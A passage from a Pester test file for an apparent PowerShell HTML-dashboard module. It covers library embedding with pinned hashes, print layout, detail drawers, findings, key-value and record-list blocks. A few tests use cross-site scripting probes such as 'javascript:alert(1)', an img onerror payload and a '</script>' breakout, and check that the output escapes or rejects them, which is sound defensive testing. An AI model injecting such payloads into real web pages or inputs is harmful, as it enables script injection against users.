            $html | Should -Match 'if \(m\) \{ themeChosen = true; applyThemeMode\(m\); return; \}'
            $html | Should -Match 'if \(!themeChosen\) applyThemeMode'
        }
    }

    Context 'N4 - -ExportLibraries' {
        It 'Cdn (default): no script tags fetch anything at load, the loader is lazy and alert() is gone' {
            $html = Export-DhTestHtml -Report (& $script:newReport)
            $html | Should -Not -Match '<script[^>]+src='
            $html | Should -Match 'var EXPORT_LIBS    = \{"mode":"cdn"'
            $html | Should -Match 'id="exp-xlsx-repl"'
            $html | Should -Not -Match "alert\(['`"]"   # a call; comments may still say alert()
            $html | Should -Match 'markExportUnavailable\('
        }
        It 'None: no XLSX or PDF buttons, CSV stays' {
            $dir = Join-Path ([IO.Path]::GetTempPath()) ('DH_T_' + [guid]::NewGuid().ToString('N')); New-Item -ItemType Directory $dir | Out-Null
            try {
                Export-DhDashboard -Report (& $script:newReport) -OutputPath "$dir/n.html" -Force -ExportLibraries None
                $html = Get-Content "$dir/n.html" -Raw
                $html | Should -Not -Match 'id="exp-xlsx-repl"'
                $html | Should -Not -Match 'id="exp-pdf-repl"'
                $html | Should -Match 'id="exp-csv-repl"'
                $html | Should -Match '"mode":"none"'
            } finally { Remove-Item -LiteralPath $dir -Recurse -Force }
        }
        It 'Embed: inlines all three libraries, each in its own script, nothing fetched' {
            $dir = Join-Path ([IO.Path]::GetTempPath()) ('DH_T_' + [guid]::NewGuid().ToString('N')); New-Item -ItemType Directory $dir | Out-Null
            try {
                Export-DhDashboard -Report (& $script:newReport) -OutputPath "$dir/e.html" -Force -ExportLibraries Embed
                $html = Get-Content "$dir/e.html" -Raw
                $libs = [regex]::Matches($html, '(?s)<script data-dh-lib="(\w+)"[^>]*>(.*?)</script>')
                @($libs | ForEach-Object { $_.Groups[1].Value }) | Should -Be @('xlsx', 'jspdf', 'autotable')
                # no library body contains a closing tag, so none ends its element early
                foreach ($m in $libs) { $m.Groups[2].Value | Should -Not -Match '(?i)</script' -Because $m.Groups[1].Value }
                # and outside the library bodies nothing is fetched
                $outside = [regex]::Replace($html, '(?s)<script data-dh-lib="\w+"[^>]*>.*?</script>', '')
                $outside | Should -Not -Match '<script[^>]+src='
                $html.Length | Should -BeGreaterThan 1MB
            } finally { Remove-Item -LiteralPath $dir -Recurse -Force }
        }
        It 'Embed refuses a vendored file that does not match its pinned hash' {
            InModuleScope DashHtml {
                Mock Get-DhExportLibraries { @([ordered]@{ Key = 'xlsx'; File = 'xlsx.full.min.js'; Version = 'x'; Url = 'u'; Sri = 'sha384-WRONG' }) }
                { Get-DhEmbeddedExportLibraries } | Should -Throw '*does not match its pinned hash*'
            }
        }
        It 'the vendored files match the hashes the CDN loader pins' {
            InModuleScope DashHtml {
                $vendor = Join-Path (Split-Path (Get-Module DashHtml).Path) 'Vendor'
                foreach ($lib in Get-DhExportLibraries) {
                    $h = 'sha384-' + [Convert]::ToBase64String([Security.Cryptography.SHA384]::HashData([IO.File]::ReadAllBytes((Join-Path $vendor $lib.File))))
                    $h | Should -Be $lib.Sri -Because $lib.File
                }
            }
        }
    }

    Context 'N5 - print' {
        It 'has a print button, before/after-print handlers and the print settings' {
            $r = New-DhDashboard -Title 'Print me' -PrintCover
            Add-DhTable -Report $r -TableId 'repl' -Title 'R' -Data $script:rows
            $dir = Join-Path ([IO.Path]::GetTempPath()) ('DH_T_' + [guid]::NewGuid().ToString('N')); New-Item -ItemType Directory $dir | Out-Null
            try {
                Export-DhDashboard -Report $r -OutputPath "$dir/p.html" -Force -PrintMaxRows 50
                $html = Get-Content "$dir/p.html" -Raw
            } finally { Remove-Item -LiteralPath $dir -Recurse -Force }
            $html | Should -Match 'id="btn-print"'
            $html | Should -Match "addEventListener\('beforeprint', dhBeforePrint\)"
            $html | Should -Match "addEventListener\('afterprint', dhAfterPrint\)"
            $html | Should -Match 'var PRINT_CONFIG   = \{"maxRows":50,"cover":true,"title":"Print me"\};'
            $html | Should -Match '@page \{ size: A4;'
        }
        It 'expands folded content in CSS, so it prints without the handlers too' {
            $css = InModuleScope DashHtml { Get-DhCssBase }
            $print = [regex]::Match($css, '(?s)v2\.2\.0 ADDITIONS.*').Value
            $print | Should -Match '\.finding\[hidden\], \.finding-body\[hidden\]'
            $print | Should -Match '\.table-section-body, \.collapsible-body, \.alert-collapsible-body'
            $print | Should -Match 'thead \{ display: table-header-group; \}'
            $print | Should -Match 'print-color-adjust: exact'
        }
        It 'puts every moved section back on afterprint' {
            $fn = Get-DhTestJsFunction -Html (Export-DhTestHtml -Report (& $script:newReport)) -Name 'dhAfterPrint'
            $fn | Should -Match 'm\.parent\.insertBefore\(m\.el'
            $fn | Should -Match '_printRows = 0'
            $fn | Should -Match 'applyThemeMode\(st\.theme\)'
        }
    }

    Context 'Tooling knows the findings block' {
        It 'is mapped in DashHtml.Design and listed by the audit and reference tools' {
            $root = Join-Path $PSScriptRoot '..'
            Get-Content (Join-Path $root 'DashHtml.Design\Private\DhSchema.ps1') -Raw | Should -Match "findings\s+= 'Add-DhFindings'"
            Get-Content (Join-Path $root 'DashHtml.Design\Public\ConvertFrom-DhScript.ps1') -Raw | Should -Match "'add-dhfindings'='findings'"
            foreach ($f in 'DashHtml.Design/Public/Update-DhScript.ps1', 'Tools/Test-DhV2Upgrade.ps1') {
                [regex]::Match((Get-Content (Join-Path $root $f) -Raw), '(?s)\$blockCmds = @\((.*?)\r?\n\s*\)').Groups[1].Value | Should -Match "'Add-DhFindings'" -Because $f
            }
            Get-Content (Join-Path $root 'Build-DhReference.ps1') -Raw | Should -Match "'Add-DhFindings'\s+= @\{"
        }
    }
}


Describe 'v2.3.0 features' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:rows = foreach ($i in 1..6) {
            [pscustomobject]@{ Name = "S$i"; Site = "FIT0$($i % 3)"; Ram = $i * 4; Roles = @('GC', 'DNS') }
        }
        $script:newReport = {
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'srv' -Title 'Servers' -Data $script:rows
            $r
        }
        $script:root = Join-Path $PSScriptRoot '..'
    }

    Context 'Sections - one spec for the drawer, key-value, record list and findings' {
        It 'normalises kinds and status names, and keeps a single section an array' {
            InModuleScope DashHtml {
                $s = ConvertTo-DhSections -Context 'x' -Sections @(@{ Kind = 'KV'; Items = @(@{ Label = 'a'; Value = 1; Class = 'cell-danger' }) })
                $s -is [array] | Should -BeTrue
                $s.Count | Should -Be 1
                $s[0].Kind | Should -Be 'kv'
                $s[0].Items[0].Status | Should -Be 'danger'
                $s[0].Items[0].Value | Should -Be '1'
            }
        }
        It 'throws, naming the context, on a malformed section' {
            InModuleScope DashHtml {
                { ConvertTo-DhSections -Context 'ctx' -Sections @(@{ Kind = 'pie' }) } | Should -Throw '*ctx*Kind*'
                { ConvertTo-DhSections -Context 'ctx' -Sections @(@{ Kind = 'kv'; Items = @(@{ Value = 1 }) }) } | Should -Throw '*Label*'
                { ConvertTo-DhSections -Context 'ctx' -Sections @(@{ Kind = 'table'; Rows = @(,@('a')) }) } | Should -Throw '*Columns*'
                { ConvertTo-DhSections -Context 'ctx' -Sections @(@{ Kind = 'bars'; Items = @(@{ Label = 'a'; Value = 'x' }) }) } | Should -Throw '*non-numeric*'
                { ConvertTo-DhSections -Context 'ctx' -Sections @(@{ Kind = 'kv'; Columns = 9; Items = @(@{ Label = 'a' }) }) } | Should -Throw '*1 to 6*'
            }
        }
        It 'refuses a javascript: link in a links section' {
            InModuleScope DashHtml {
                { ConvertTo-DhSections -Context 'ctx' -Sections @(@{ Kind = 'links'; Items = @(@{ Label = 'x'; Url = 'javascript:alert(1)' }) }) } | Should -Throw '*not allowed*'
            }
        }
        It 'serialises with an escaped script end tag and the same bytes every time' {
            InModuleScope DashHtml {
                $spec = ConvertTo-DhSections -Context 'x' -Sections @(@{ Kind = 'kv'; Items = @(@{ Label = 'a</script>'; Value = 'v' }) })
                $j1 = ConvertTo-DhSectionsJson $spec
                $j1 | Should -Not -Match '</script'
                $j1 | Should -Be (ConvertTo-DhSectionsJson $spec)
                $j1 | Should -Be '[{"kind":"kv","title":"","columns":2,"items":[{"label":"a<\/script>","value":"v","status":""}]}]'
            }
        }
        It 'renders sections in one pure function that escapes values and binds no inline handler' {
            $html = Export-DhTestHtml -Report (& $script:newReport)
            $fn = Get-DhTestJsFunction -Html $html -Name 'renderSection'
            $fn | Should -Match 'esc\(it\.label\)'
            $fn | Should -Not -Match '\son(click|keydown|load|error)\s*='
            $html | Should -Match 'function renderSections\(sections\)'
        }
    }

    Context 'Add-DhKeyValue' {
        It 'stores the tiles under the cmdlet parameter names and emits one kv section' {
            $r = & $script:newReport
            Add-DhKeyValue -Report $r -Id 'kv' -Title 'System' -Columns 4 -NavPath 'Hw' -Items @(
                @{ Label = 'Model'; Value = 'VMware' }, @{ Label = 'CPU'; Value = '2%'; Status = 'ok' }, @{ Label = 'Empty' })
            $b = $r.Blocks | Where-Object Id -EQ 'kv'
            $b.BlockType | Should -Be 'keyvalue'
            @($b.Items).Count | Should -Be 3
            $b.Columns | Should -Be 4
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"blockType":"keyvalue","id":"kv","title":"System","sections":\[\{"kind":"kv","title":"","columns":4,"items":\['
            $html | Should -Match '"label":"CPU","value":"2%","status":"ok"'
            $html | Should -Match 'data-navpath="\[&quot;Hw&quot;\]"'
        }
        It 'validates its input' {
            $r = & $script:newReport
            { Add-DhKeyValue -Report $r -Id 'k' -Items @() } | Should -Throw
            { Add-DhKeyValue -Report $r -Id 'k' -Items @(@{ Value = 1 }) } | Should -Throw '*Label*'
            { Add-DhKeyValue -Report $r -Id 'k' -Columns 7 -Items @(@{ Label = 'a' }) } | Should -Throw
        }
        It 'encodes hostile text' {
            $r = & $script:newReport
            Add-DhKeyValue -Report $r -Id 'k' -Items @(@{ Label = '</script><b>'; Value = '"><img src=x onerror=1>' })
            $html = Export-DhTestHtml -Report $r
            $html | Should -Not -Match '</script><b>'
            $html | Should -Match '\"label\":\"<\\/script><b>\"'
            # the value stays inside a JSON string (quote escaped); the page renders it through esc()
            $html | Should -Match '"value":"\\"><img src=x onerror=1>"'
        }
    }

    Context 'Detail drawer on a table row (N10)' {
        It 'emits the drawer config only with -DetailDrawer, columns first then the other properties' {
            $r = & $script:newReport
            (Export-DhTestHtml -Report $r) | Should -Not -Match '"detail":\{'
            $r2 = New-DhDashboard -Title 't'
            Add-DhTable -Report $r2 -TableId 'srv' -Title 'S' -Data $script:rows -DetailDrawer -Columns @(@{ Field = 'Name'; Label = 'Server' })
            $html = Export-DhTestHtml -Report $r2
            $html | Should -Match '"detail":\{"titleField":"Name","fields":\[\{"field":"Name","label":"Server"\},\{"field":"Site","label":"Site"\},\{"field":"Ram","label":"Ram"\},\{"field":"Roles","label":"Roles"\}\]\}'
        }
        It 'honours -DetailFields (names or label hashtables) and -DetailTitleField' {
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'srv' -Title 'S' -Data $script:rows -DetailDrawer -DetailTitleField 'Site' `
                -DetailFields @('Name', @{ Field = 'Ram'; Label = 'RAM (GB)' })
            $t = $r.Tables[0]
            $t.DetailTitleField | Should -Be 'Site'
            @($t.DetailFields).Count | Should -Be 2
            $t.DetailFields[1].Label | Should -Be 'RAM (GB)'
        }
        It 'rejects a field the data does not have (case-sensitive) and warns when the switch is missing' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTable -Report $r -TableId 'a' -Title 'S' -Data $script:rows -DetailDrawer -DetailFields @('nope') } | Should -Throw '*not a property*'
            { Add-DhTable -Report $r -TableId 'b' -Title 'S' -Data $script:rows -DetailDrawer -DetailTitleField 'name' } | Should -Throw '*not a property*'
            $w = Add-DhTable -Report $r -TableId 'c' -Title 'S' -Data $script:rows -DetailFields @('Name') 3>&1
            ($w | Out-String) | Should -Match 'no effect without -DetailDrawer'
        }
        It 'binds the row, keeps master-detail links, and hands focus back by selector' {
            $html = Export-DhTestHtml -Report (& $script:newReport)
            $html | Should -Match 'TableEngine\.prototype\._openDetail'
            $html | Should -Match "if\(this\.detail\)this\._openDetail\(globalIdx,row,tr\)"
            $html | Should -Match "restore:'#tbody-'\+this\.id\+' tr\[data-idx="
            $html | Should -Match "if\(e\.target\.closest&&e\.target\.closest\('a'\)\)return;"
        }
    }

    Context 'The drawer itself' {
        BeforeAll { $script:dhtml = Export-DhTestHtml -Report (& $script:newReport) }
        It 'is created once on the body, with dialog semantics' {
            $fn = Get-DhTestJsFunction -Html $script:dhtml -Name 'dhDrawerEnsure'
            $fn | Should -Match 'document\.body\.appendChild\(root\)'
            $fn | Should -Match "setAttribute\('role', 'dialog'\)"
            $fn | Should -Match "setAttribute\('aria-modal', 'true'\)"
        }
        It 'closes on Escape and on the backdrop, and returns focus to the opener or its selector' {
            $script:dhtml | Should -Match "e\.key === 'Escape' && _drawer"
            (Get-DhTestJsFunction -Html $script:dhtml -Name 'dhDrawerClose') | Should -Match 'document\.querySelector\(d\.restore\)'
        }
        It 'is closed by a view change and by printing' {
            (Get-DhTestJsFunction -Html $script:dhtml -Name 'applyNav') | Should -Match "dhDrawerClose\(true\)"
            (Get-DhTestJsFunction -Html $script:dhtml -Name 'dhBeforePrint') | Should -Match "dhDrawerClose\(true\)"
            $script:dhtml | Should -Match '@media print\s*\{\s*\.dh-drawer, \.dh-drawer-backdrop \{ display: none !important; \}'
        }
        It 'uses no inline event handler attribute' {
            InModuleScope DashHtml { (Get-DhJsDrawer) | Should -Not -Match '\son(click|keydown|input|change)\s*=' }
        }
    }

    Context 'Status grid - Detail, Glyph and SelfDiagonal (N12)' {
        BeforeAll {
            $script:grid = {
                param($cells, [switch] $Self)
                $r = New-DhDashboard -Title 't'
                if ($Self) { Add-DhStatusGrid -Report $r -Id 'g' -Title 'G' -Rows @('A', 'B') -Columns @('a', 'b') -Cells $cells -SelfDiagonal }
                else { Add-DhStatusGrid -Report $r -Id 'g' -Title 'G' -Rows @('A', 'B') -Columns @('a', 'b') -Cells $cells }
                $r
            }
        }
        It 'accepts text, one section, an array of sections or the full form as Detail' {
            $r = & $script:grid @(
                @{ Row = 'A'; Column = 'a'; Status = 'ok'; Detail = 'plain text' }
                @{ Row = 'A'; Column = 'b'; Status = 'ok'; Detail = @{ Kind = 'kv'; Items = @(@{ Label = 'x'; Value = 'y' }) } }
                @{ Row = 'B'; Column = 'a'; Status = 'ok'; Detail = @(@{ Kind = 'text'; Text = 't' }, @{ Kind = 'checks'; Items = @(@{ Label = 'c'; Ok = $true }) }) }
                @{ Row = 'B'; Column = 'b'; Status = 'ok'; Detail = @{ Title = 'T'; Subtitle = 'S'; Sections = @(@{ Kind = 'text'; Text = 't' }) } })
            $cells = $r.Blocks[0].Cells
            $cells[0].Detail.Sections[0].Kind | Should -Be 'text'
            $cells[1].Detail.Sections.Count | Should -Be 1
            $cells[2].Detail.Sections.Count | Should -Be 2
            $cells[3].Detail.Title | Should -Be 'T'
        }
        It 'rejects a Detail of an unknown kind and a glyph longer than 3 characters' {
            { & $script:grid @(@{ Row = 'A'; Column = 'a'; Status = 'ok'; Detail = @{ Kind = 'chart' } }) } | Should -Throw '*Kind*'
            { & $script:grid @(@{ Row = 'A'; Column = 'a'; Status = 'ok'; Glyph = 'toolong' }) } | Should -Throw '*Glyph*'
        }
        It 'hatches the diagonal only where the labels match and nothing was declared' {
            $r = & $script:grid @(@{ Row = 'A'; Column = 'a'; Status = 'ok' }, @{ Row = 'A'; Column = 'b'; Status = 'ok' }) -Self
            $self = @($r.Blocks[0].Cells | Where-Object Self)
            $self.Count | Should -Be 1
            "$($self[0].Row)/$($self[0].Column)" | Should -Be 'B/b'
            $self[0].Status | Should -Be 'nodata'
        }
        It 'emits glyph, self and detail only when used, so a plain grid is unchanged' {
            $plain = Export-DhTestHtml -Report (& $script:grid @(@{ Row = 'A'; Column = 'a'; Status = 'ok' }))
            $plain | Should -Not -Match '"glyph"|"self"|"detail"'
            $plain | Should -Match '"linkTableId":"","linkFilter":""\}'
            $rich = Export-DhTestHtml -Report (& $script:grid @(@{ Row = 'A'; Column = 'a'; Status = 'ok'; Glyph = 'v'; Detail = 'd' }) -Self)
            $rich | Should -Match '"glyph":"v"'
            $rich | Should -Match '"self":true'
            $rich | Should -Match '"detail":\{"title":"","subtitle":"","sections":\[\{"kind":"text"'
        }
        It 'makes a cell with detail a keyboard-operable button that opens the drawer' {
            $html = Export-DhTestHtml -Report (& $script:grid @(@{ Row = 'A'; Column = 'a'; Status = 'ok'; Detail = 'd' }))
            $fn = Get-DhTestJsFunction -Html $html -Name 'renderStatusGrid'
            $fn | Should -Match 'role="button" tabindex="0"'
            $fn | Should -Match 'dhDrawerOpen\('
            $fn | Should -Match "e\.key === 'Enter' \|\| e\.key === ' '"
        }
    }

    Context 'Score ring and maturity ladder' {
        It 'validates a score like a gauge and defaults Max to 100' {
            $r = New-DhDashboard -Title 't'
            { Add-DhSummary -Report $r -Items @(@{ Style = 'score'; Label = 'S'; Value = 'abc' }) } | Should -Throw "*Style='score' requires a numeric Value*"
            { Add-DhSummary -Report $r -Items @(@{ Style = 'score'; Label = 'S'; Value = $null }) } | Should -Throw '*requires a numeric Value*'
            { Add-DhSummary -Report $r -Items @(@{ Style = 'score'; Label = 'S'; Value = $null; Rag = @{ NoData = $true } }) } | Should -Not -Throw
            $r2 = New-DhDashboard -Title 't'
            Add-DhSummary -Report $r2 -Items @(@{ Style = 'score'; Label = 'S'; Value = 69 })
            $r2.Summary[0].Max | Should -Be 100
        }
        It 'emits score extras in a fixed order and nothing for other styles' {
            $r = New-DhDashboard -Title 't'
            Add-DhSummary -Report $r -Items @(
                @{ Style = 'score'; Label = 'Posture'; Value = 69; Caption = 'Elevated risk'; Facts = @('211 checks', '31 failed'); Previous = 66; LowerIsBetter = $true; NotAssessed = 20 }
                @{ Label = 'Plain'; Value = 3 })
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"style":"score","caption":"Elevated risk","min":0,"max":100,"unit":"","thresholds":\[\],"facts":\["211 checks","31 failed"\],"lowerIsBetter":true,"notAssessed":20,"previous":66'
            $html | Should -Not -Match '"label":"Plain"[^}]*"facts"'
        }
        It 'draws a ring from two stroked circles with theme tokens only, clamps and handles a missing value' {
            $fn = Get-DhTestJsFunction -Html (Export-DhTestHtml -Report (& $script:newReport)) -Name 'buildScoreTile'
            $fn | Should -Match 'stroke-dashoffset'
            $fn | Should -Match 'Math\.max\(0, Math\.min\(1,'
            $fn | Should -Match "isMissing \? '—'"
            $fn | Should -Match 'role="img" aria-label='
            $fn | Should -Not -Match '#[0-9a-fA-F]{3,6}\b'
        }
        It 'lets LowerIsBetter flip only the delta colour' {
            $fn = Get-DhTestJsFunction -Html (Export-DhTestHtml -Report (& $script:newReport)) -Name 'buildScoreTile'
            $fn | Should -Match 'item\.lowerIsBetter && item\.trendIsGood == null'
        }
        It 'validates a maturity ladder' {
            $r = New-DhDashboard -Title 't'
            $lv = @('Initial', 'Managed', 'Defined')
            { Add-DhSummary -Report $r -Items @(@{ Style = 'maturity'; Label = 'M'; Value = 'x'; Levels = @('One'); Current = 1 }) } | Should -Throw '*2 to 10 steps*'
            { Add-DhSummary -Report $r -Items @(@{ Style = 'maturity'; Label = 'M'; Value = 'x'; Levels = $lv; Current = 4 }) } | Should -Throw '*0 to 3*'
            { Add-DhSummary -Report $r -Items @(@{ Style = 'maturity'; Label = 'M'; Value = 'x'; Levels = $lv }) } | Should -Throw '*Current*'
            { Add-DhSummary -Report $r -Items @(@{ Style = 'maturity'; Label = 'M'; Value = 'x'; Levels = $lv; Current = 1; Criteria = @(@{ Level = 9; Text = 't' }) }) } | Should -Throw '*Criteria Level*'
            { Add-DhSummary -Report $r -Items @(@{ Style = 'maturity'; Label = 'M'; Value = 'x'; Levels = $lv; Current = 0 }) } | Should -Not -Throw
        }
        It 'serialises levels, current step and criteria' {
            $r = New-DhDashboard -Title 't'
            Add-DhSummary -Report $r -Items @(@{ Style = 'maturity'; Label = 'Maturity'; Value = 'Initial'; Current = 1
                Levels = @(@{ Name = 'Initial'; Description = 'Ad hoc' }, 'Managed'); Criteria = @(@{ Level = 2; Text = 'Enable X'; Met = $false }) })
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"levels":\[\{"name":"Initial","description":"Ad hoc"\},\{"name":"Managed","description":""\}\],"current":1,"criteria":\[\{"level":2,"text":"Enable X","met":false\}\]'
        }
        It 'marks the current step and caps the criteria list' {
            $fn = Get-DhTestJsFunction -Html (Export-DhTestHtml -Report (& $script:newReport)) -Name 'buildMaturityTile'
            $fn | Should -Match 'aria-current="step"'
            $fn | Should -Match 'want\.slice\(0, 8\)'
        }
        It 'dispatches both styles and puts the score on the print cover' {
            $html = Export-DhTestHtml -Report (& $script:newReport)
            $html | Should -Match "case 'score':\s+tile = buildScoreTile\(item\)"
            $html | Should -Match "case 'maturity':\s+tile = buildMaturityTile\(item\)"
            (Get-DhTestJsFunction -Html $html -Name 'dhBeforePrint') | Should -Match "\['\.tile-verdict', '\.tile-score'\]"
        }
    }

    Context 'Findings - split layout, facts, evidence, change, detail' {
        BeforeAll {
            $script:fnd = {
                param($extra = @{}, $layout = 'List')
                $r = New-DhDashboard -Title 't'
                $f = @{ Severity = 'warning'; Title = 'NTLM level'; Area = 'Auth'; Description = 'd' } + $extra
                Add-DhFindings -Report $r -Id 'h' -Layout $layout -Findings @($f)
                $r
            }
        }
        It 'keeps the List layout and a plain finding byte-identical to 2.2.0' {
            $html = Export-DhTestHtml -Report (& $script:fnd)
            $html | Should -Not -Match '"layout"|"maxEvidenceShown"|"facts"|"evidence"|"change"|"detail"'
            $html | Should -Match '"references":\[\]\}\],"collapsible"'
        }
        It 'emits layout split with the evidence cap' {
            $html = Export-DhTestHtml -Report (& $script:fnd @{} 'Split')
            $html | Should -Match '"layout":"split","maxEvidenceShown":50'
        }
        It 'normalises facts and evidence and emits them only when present' {
            $html = Export-DhTestHtml -Report (& $script:fnd @{
                Facts = @(@{ Label = 'Recommended'; Value = '5'; Status = 'ok' })
                Evidence = @(@{ Object = 'DC1'; Value = 'Level 4'; Status = 'Warn' }, @{ Object = 'DC2' }) })
            $html | Should -Match '"facts":\[\{"label":"Recommended","value":"5","status":"ok"\}\]'
            $html | Should -Match '"evidence":\[\{"object":"DC1","value":"Level 4","status":"warn","note":""\},\{"object":"DC2","value":"","status":"","note":""\}\]'
        }
        It 'validates evidence, change and detail' {
            { & $script:fnd @{ Evidence = @(@{ Value = 'x' }) } } | Should -Throw '*Object*'
            { & $script:fnd @{ Change = 'gone' } } | Should -Throw '*new, worse, better or resolved*'
            { & $script:fnd @{ Detail = @{ Kind = 'pie' } } } | Should -Throw '*Kind*'
            (Export-DhTestHtml -Report (& $script:fnd @{ Change = 'NEW' })) | Should -Match '"change":"new"'
        }
        It 'carries a detail spec to the drawer button' {
            $html = Export-DhTestHtml -Report (& $script:fnd @{ Detail = @{ Title = 'T'; Sections = @(@{ Kind = 'text'; Text = 'x' }) } })
            $html | Should -Match '"detail":\{"title":"T","subtitle":"","sections":\[\{"kind":"text","title":"","text":"x"\}\]\}'
            (Get-DhTestJsFunction -Html $html -Name 'renderFindings') | Should -Match 'class="finding-more-detail"'
        }
        It 'allows a block that found nothing, with a positive message' {
            $r = New-DhDashboard -Title 't'
            Add-DhFindings -Report $r -Id 'e' -Findings @() -AllClearText 'Nothing found.'
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"findings":\[\],"allClear":"Nothing found."'
            (Get-DhTestJsFunction -Html $html -Name 'allClearHtml') | Should -Match 'dh-allclear-ico'
        }
        It 'keeps every detail pane in the DOM and stacks them for print' {
            $html = Export-DhTestHtml -Report (& $script:fnd @{} 'Split')
            (Get-DhTestJsFunction -Html $html -Name 'renderFindings') | Should -Match 'findings-split-detail'
            $html | Should -Match '\.finding-pane\[hidden\] \{ display: block !important; \}'
            $html | Should -Match '\.findings-split-list \{ display: none !important; \}'
        }
        It 'filters by change as well as severity' {
            $fn = Get-DhTestJsFunction -Html (Export-DhTestHtml -Report (& $script:fnd)) -Name 'renderFindings'
            $fn | Should -Match 'activeChange'
            $fn | Should -Match 'findings-chip-change'
        }
    }

    Context 'Add-DhRecordList' {
        It 'validates its records' {
            $r = & $script:newReport
            { Add-DhRecordList -Report $r -Id 'l' -Items @(@{ Subtitle = 's' }) } | Should -Throw '*no Title*'
            { Add-DhRecordList -Report $r -Id 'l' -Items @(@{ Title = 'a'; Id = 'x' }, @{ Title = 'b'; Id = 'x' }) } | Should -Throw '*duplicate record Id*'
            { Add-DhRecordList -Report $r -Id 'l' -Items @(@{ Title = 'a'; Metrics = @(1..5 | ForEach-Object { @{ Label = "m$_"; Value = $_ } }) }) } | Should -Throw '*at most 4 Metrics*'
            { Add-DhRecordList -Report $r -Id 'l' -Items @(@{ Title = 'a'; Sections = @(@{ Kind = 'nope' }) }) } | Should -Throw '*Kind*'
            { Add-DhRecordList -Report $r -Id 'l' -Items @() } | Should -Throw
        }
        It 'emits records with metrics and sections' {
            $r = & $script:newReport
            Add-DhRecordList -Report $r -Id 'hw' -Title 'Hardware' -NavPath 'Hw' -Items @(
                @{ Title = 'dc01'; Subtitle = 'FIT00'; Status = 'ok'; Metrics = @(@{ Label = 'RAM'; Value = '8 GB' })
                   Sections = @(@{ Kind = 'kv'; Items = @(@{ Label = 'Model'; Value = 'VM' }) }) })
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"blockType":"recordlist","id":"hw","title":"Hardware","filterable":true,"openAll":false,"items":\[\{"id":"r1","title":"dc01","subtitle":"FIT00","status":"ok","metrics":\[\{"label":"RAM","value":"8 GB","status":""\}\],"sections":\[\{"kind":"kv"'
            $html | Should -Match 'data-navpath="\[&quot;Hw&quot;\]"'
        }
        It 'warns above -MaxItems instead of failing' {
            $r = & $script:newReport
            $w = Add-DhRecordList -Report $r -Id 'l' -MaxItems 1 -Items @(@{ Title = 'a' }, @{ Title = 'b' }) 3>&1
            ($w | Out-String) | Should -Match 'exceeds -MaxItems'
            $r.Blocks.Count | Should -Be 1
        }
        It 'builds bodies once, binds no inline handler and prints them expanded' {
            $html = Export-DhTestHtml -Report (& $script:newReport)
            $fn = Get-DhTestJsFunction -Html $html -Name 'renderRecordList'
            $fn | Should -Match 'esc\(r\.title\)'
            $fn | Should -Not -Match '\son(click|keydown|input)\s*='
            $html | Should -Match '\.record-body\[hidden\] \{ display: block !important; \}'
        }
    }

    Context 'Bar colours (-Rag, -KeyClass)' {
        It 'emits keyClass and thresholds only when set' {
            $r = & $script:newReport
            Add-DhBarChart -Report $r -Id 'plain' -Title 'P' -TableId 'srv' -Field 'Site'
            Add-DhBarChart -Report $r -Id 'col' -Title 'C' -TableId 'srv' -Field 'Site' -KeyClass @{ FIT00 = 'cell-danger'; FIT01 = 'ok' } `
                -Rag @{ Green = @{ Max = 3 }; Red = @{ Min = 3 } }
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"id":"plain"[^}]*"clickFilters":false,"stacked":false,"seriesField":"","collapsible"'
            $html | Should -Match '"id":"col"[^}]*"thresholds":\[\{"max":3,"class":"cell-ok"\},\{"min":3,"class":"cell-danger"\}\],"keyClass":\{"FIT00":"cell-danger","FIT01":"cell-ok"\}'
        }
        It 'rejects a class that is not one of the four and ignores colours when stacked' {
            $r = & $script:newReport
            { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'srv' -Field 'Site' -KeyClass @{ A = 'red' } } | Should -Throw '*cell-ok, cell-warn, cell-danger or cell-nodata*'
            $w = Add-DhBarChart -Report $r -Id 's' -Title 'S' -TableId 'srv' -Field 'Site' -SeriesField 'Name' -KeyClass @{ A = 'cell-ok' } 3>&1
            ($w | Out-String) | Should -Match 'ignored on a stacked chart'
        }
        It 'turns a class into one of four fill classes and nothing else' {
            $fn = Get-DhTestJsFunction -Html (Export-DhTestHtml -Report (& $script:newReport)) -Name 'barFillClass'
            $fn | Should -Match '\^cell-\(ok\|warn\|danger\|nodata\)\$'
        }
    }

    Context 'Chips and path cells, all-clear tables' {
        It 'accepts the new cell types and still rejects an unknown one' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTable -Report $r -TableId 'a' -Title 'A' -Data $script:rows -Columns @(@{ Field = 'Roles'; Label = 'R'; CellType = 'chips' }) } | Should -Not -Throw
            { Add-DhTable -Report $r -TableId 'b' -Title 'B' -Data $script:rows -Columns @(@{ Field = 'Roles'; Label = 'R'; CellType = 'path' }) } | Should -Not -Throw
            { Add-DhTable -Report $r -TableId 'c' -Title 'C' -Data $script:rows -Columns @(@{ Field = 'Roles'; Label = 'R'; CellType = 'tags' }) } | Should -Throw "*'chips' or 'path'*"
        }
        It 'keeps list elements as strings in a chips column ("007" stays "007")' {
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'a' -Title 'A' -Data @([pscustomobject]@{ Ids = @('007', '12'); Spark = @('007', '12') }) `
                -Columns @(@{ Field = 'Ids'; Label = 'I'; CellType = 'chips' }, @{ Field = 'Spark'; Label = 'S'; CellType = 'sparkline' })
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"Ids":\["007","12"\]'
            $html | Should -Match '"Spark":\[7,12\]'
        }
        It 'renders chips and path with DOM calls and exports them as joined text' {
            $html = Export-DhTestHtml -Report (& $script:newReport)
            $html | Should -Match "cellType==='chips'\|\|cellType==='path'"
            $html | Should -Match "rawVal\.join\(' → '\)"
        }
        It 'shows an all-clear card for an empty table instead of an empty-table warning' {
            $r = New-DhDashboard -Title 't'
            $w = Add-DhTable -Report $r -TableId 'e' -Title 'Stale' -Data @() -AllClearText 'None found.' 3>&1
            ($w | Out-String) | Should -Not -Match 'empty'
